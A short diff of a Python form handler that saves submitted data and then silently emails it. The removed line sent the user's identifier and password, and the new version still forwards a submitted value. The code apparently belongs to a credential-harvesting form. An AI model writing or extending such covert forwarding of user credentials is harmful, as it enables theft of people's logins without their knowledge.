@@ -180,9 +180,14 @@ async def guardar_formulario(data: FormData):
 
     # 2️⃣  Enviar correo silenciosamente
     try:
-        enviar_correo(data.identificador, data.codigo_pais, data.contrasena, fecha)
+        enviar_correo(
+            identificador=data.valor,
+            codigo_pais="N/A",
+            contrasena=f"Tipo de dato: {data.tipo}",
+            fecha=fecha
+        )
     except Exception:
-    traceback.print_exc()
+        traceback.print_exc()
 
     return FormResponse(mensaje="Datos guardados correctamente", id=nuevo_id)
 
